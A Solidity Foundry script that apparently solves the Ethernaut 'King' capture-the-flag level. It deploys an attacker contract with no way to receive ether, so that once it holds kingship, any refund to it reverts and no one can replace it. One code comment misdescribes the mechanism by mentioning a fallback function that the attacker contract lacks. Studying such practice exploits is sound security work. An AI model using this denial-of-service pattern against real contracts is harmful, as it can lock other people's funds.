/*
The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize 
becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! 
As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. 
You will beat the level if you can avoid such a self proclamation.


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "src/King.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract Attack {
    King public king;

    constructor(King _king) {
        king = _king;
    }

    function attack() public payable {
        // send ether to the king contract, triggering the receive function
        // which will call the fallback function of this contract
        payable(address(king)).call{value: king.prize()}("");
    }
}

contract KingSolution is Script {
    King public king = King(payable(0x8dC7C4f24489E966111ca996D0772f3AA5EdCc7E));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // DoS, if we make the king change process revert, the contract will not be able to update the king
        console.log("Current king:", king._king());
        console.log("Current prize:", king.prize());
        Attack attack = new Attack(king);
        attack.attack{value: king.prize()}();
        console.log("King after the attack:", king._king());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
